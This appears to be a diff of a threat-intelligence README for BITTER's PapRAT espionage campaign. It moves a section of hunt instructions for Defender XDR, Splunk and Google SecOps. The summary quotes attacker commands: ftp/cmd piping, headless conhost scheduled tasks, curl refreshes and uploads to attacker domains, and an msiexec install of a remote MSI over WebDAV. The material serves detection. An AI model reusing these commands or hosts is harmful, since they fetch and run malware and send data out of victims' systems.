@@ -6,6 +6,19 @@
 |---|---|---|---|---|---|
 | 2026-11-02 | 2026-11-12 18:20 | 2026-11-12 | Nation-state / espionage | 18 | 18 |
 
+## Hunt
+
+Run one of these before blocking to find past activity. Each file is the same hunt written for a different platform; pick the one for your SIEM or XDR.
+
+| File | Platform | How to run it |
+|---|---|---|
+| [`hunt.kql`](hunt.kql) | Microsoft Defender XDR | In the [Defender portal](https://security.microsoft.com), open **Hunting > Advanced hunting**, paste the query and select **Run query**. It covers the last 30 days. |
+| [`hunt.spl`](hunt.spl) | Splunk | In **Search & Reporting**, set the time picker to the last 30 days or more, paste the search and run it. It reads the CIM data models. |
+| [`hunt_raw.spl`](hunt_raw.spl) | Splunk without CIM | The same hunt over raw events. Define the `rti_*` macros from [`splunk_macros.conf`](../../../../all/splunk_macros.conf) first. |
+| [`hunt.yaral`](hunt.yaral) | Google SecOps | In **Detection > Rules & Detections > Rules Editor**, paste the rule, run a Retrohunt over the last 30 days, then turn on live mode. |
+
+Leads that are not network or hash indicators are in [`iocs.csv`](iocs.csv), and behaviours with no clean field mapping are in the Behaviours section below. Guides: [Defender XDR](../../../../docs/defender-xdr.md), [Splunk](../../../../docs/splunk.md), [Google SecOps](../../../../docs/google-secops.md).
+
 ## Summary
 
 FortiGuard Labs attributes with high confidence to BITTER, a suspected South Asian espionage group active since 2013 that targets government, energy and engineering organisations, a campaign against South Asian organisations built on three infection chains and a new remote access trojan, PapRAT. In chain 1, a LNK lure runs the native ftp.exe, whose ! prefix pipes res.ico to cmd; the script creates scheduled tasks such as MicrosoftUpdates\updates11678 and BiosUpdates\update101 that run 'conhost --headless cmd /c more <file>|cmd' on files in C:\users\public\music\err.log or C:\programdata\talk.log, refreshed with curl from goodnfortunes.com and techtalkhelp.com, uploads a reconnaissance file to goodnfortunes.com/ucl.php and shows a fake 'Explorer was unable to open this file!' message. In chain 2, a VHDX image holds a LNK that runs 'cmd.exe /c Visa_Details.msi & Attachment-2.xls', and the MSI's only action is a Type 194 custom action that drops PapRAT disguised as bruzsvc.exe ('Microsoft redistributables'). In chain 3, Invitation 2026.url opens a WebDAV share on rappellingaart.com and the next stage runs 'msiexec /i \\rappellingaart.com@SSL\secure-docs\Imp_Details.msi /qn'. PapRAT, in C++ and Rust builds, polls rivingtonclarks.com or chestergreenfarming.com over HTTP and downloaded WmRAT (vnces.exe), which talks to netmansrvdns.com. All eight domains, five URLs and five hashes are on the block list.
@@ -95,19 +108,6 @@ Indicators by type: 8 domains, 5 URLs, 5 SHA256. See `iocs.csv` for full details
    Source: [Fortinet](https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat)
 
 Behaviours that map cleanly to log fields are included in [`hunt.kql`](hunt.kql) and [`hunt.spl`](hunt.spl), and alert behaviours in [`hunt.yaral`](hunt.yaral). The rest are listed in the Behaviours section above with where to look. Use behaviours to hunt and alert, never to block.
-
-## Hunt
-
-Run one of these before blocking to find past activity. Each file is the same hunt written for a different platform; pick the one for your SIEM or XDR.
-
-| File | Platform | How to run it |
-|---|---|---|
-| [`hunt.kql`](hunt.kql) | Microsoft Defender XDR | In the [Defender portal](https://security.microsoft.com), open **Hunting > Advanced hunting**, paste the query and select **Run query**. It covers the last 30 days. |
-| [`hunt.spl`](hunt.spl) | Splunk | In **Search & Reporting**, set the time picker to the last 30 days or more, paste the search and run it. It reads the CIM data models. |
-| [`hunt_raw.spl`](hunt_raw.spl) | Splunk without CIM | The same hunt over raw events. Define the `rti_*` macros from [`splunk_macros.conf`](../../../../all/splunk_macros.conf) first. |
-| [`hunt.yaral`](hunt.yaral) | Google SecOps | In **Detection > Rules & Detections > Rules Editor**, paste the rule, run a Retrohunt over the last 30 days, then turn on live mode. |
-
-Leads that are not network or hash indicators are in [`iocs.csv`](iocs.csv), and behaviours with no clean field mapping are in the Behaviours section above. Guides: [Defender XDR](../../../../docs/defender-xdr.md), [Splunk](../../../../docs/splunk.md), [Google SecOps](../../../../docs/google-secops.md).
 
 ## Sources
 
